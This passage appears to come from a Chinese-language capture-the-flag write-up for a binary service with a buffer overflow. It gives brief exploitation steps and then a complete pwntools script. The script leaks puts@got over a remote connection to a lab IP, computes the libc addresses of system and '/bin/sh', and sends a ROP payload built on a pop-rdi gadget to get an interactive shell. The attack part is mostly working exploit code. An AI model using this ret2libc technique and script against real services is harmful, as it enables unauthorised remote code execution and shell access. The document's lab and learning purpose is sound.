    if ( *(_BYTE *)buf == v5 )  
    {

输入可造成缓冲区溢出
利用:
1.db 使用puts
2.db puts@got_plt
3.溢出old eip 为pop edi,ret，将/bin/sh地址放入edi
4.ret为system

0x02 exp

from pwn import *  

lib = ELF("/lib/libc.so.6")  

r = remote("192.168.56.102", 6666)  
r.recvuntil(">")  
r.sendline("db 603028")         #use puts  

r.recvuntil(">")  
r.sendline("db 603028")         #leak addr  
data = r.recvuntil(">")  
data = data.strip().replace(' ', '')[9:25]  
res = ''  
for i in range(8):  
    res = data[i*2: i*2+2] + res  
puts_got = int(res, 16)           
system_addr = (lib.symbols['system'] - lib.symbols['puts'] + puts_got)  
sh_addr = (lib.search("/bin/sh").next() - lib.symbols['puts'] + puts_got)  

#0x0000000000401a13 : pop rdi ; ret  
pop_rdi_ret = 0x0000000000401a13   

pay  = ''  
pay += 'A'*0x120  
pay += 'BBBBBBBB'  
pay += p64(pop_rdi_ret)  
pay += p64(sh_addr)  
pay += p64(system_addr)  

r.sendline(pay)  
r.sendline('c')  


r.interactive()
